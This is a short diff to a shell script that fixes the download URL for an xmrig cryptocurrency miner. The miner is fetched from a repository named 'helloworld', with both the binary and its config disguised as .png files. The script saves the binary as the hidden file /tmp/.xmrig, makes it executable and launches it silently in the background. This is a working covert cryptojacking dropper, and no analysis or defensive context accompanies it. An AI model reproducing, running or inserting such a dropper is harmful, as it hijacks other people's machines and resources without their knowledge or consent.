@@ -1,4 +1,4 @@
-curl https://github.com/m11001alpha/helloworld/raw/master/xmrig.png -o /tmp/.xmrig
+curl https://raw.githubusercontent.com/m11001alpha/helloworld/master/xmrig.png -o /tmp/.xmrig
 curl https://raw.githubusercontent.com/m11001alpha/helloworld/master/config.json.png -o /tmp/config.json
 chmod 744 /tmp/.xmrig
 nohup /tmp/.xmrig >/dev/null 2>&1 &
